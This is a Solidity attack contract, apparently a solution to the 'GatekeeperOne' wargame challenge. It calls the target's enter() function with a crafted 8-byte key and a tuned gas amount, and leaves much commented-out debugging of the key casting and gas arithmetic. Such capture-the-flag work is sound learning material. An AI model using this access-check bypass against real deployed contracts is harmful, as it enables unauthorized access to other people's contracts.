// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
    function checkGateThree(bytes8 _gateKey) external view; 
}

contract GatekeeperOneAttack {

    address eoa;
    GatekeeperOne gatekeeperOne;
    

    constructor(address _eoa, address _gkoAddress) {
        eoa = _eoa;
        gatekeeperOne = GatekeeperOne(_gkoAddress);

    }

    function attack(bytes8 _gateKey, uint gasToUse) public {
        // Passing in 719 as the gateKeyInt value passes 3b
        // 719 is 0x02cf in hex
        // uint64 gateKeyInt = uint64(uint160(719));
        
        // bytes8 _gateKey = bytes8(0xf0000000000002cf);
        // uint64 seven = uint64(0xf0000000000002cf);
        // // uint16 gateKey = uint16(uint160(eoa));
        // console.log("bytes8 _gateKey: ");
        // console.logBytes8(_gateKey);
        // console.log("719 in bytes:");
        // console.log(seven);
        // // ---------------------------
        // uint64 gK_64 = uint64(_gateKey);
        // console.log("gK_64 (doesnt match 32_64)", gK_64);
        // uint32 eoa_32_64 = uint32(uint64(_gateKey));
        // console.log("gK_32_64", eoa_32_64);
        // uint16 eoa_16_64 = uint16(uint64(_gateKey));
        // console.log("gK_16_64", eoa_16_64); 
        // while (gasleft() % 8191 != 0) {
        //     // uint256 gasr = gasleft();
        //     // console.log("gas",gasr);
        // }
        // uint256 gas = gasleft();
        // console.log("gas end", gas);
        // uint256 gase = gasleft();
        // console.log("gase end", gase);
        // uint256 gasx = gasleft();
        // console.log("gasx end", gasx);
        gatekeeperOne.enter{gas: gasToUse}(_gateKey);
    }
}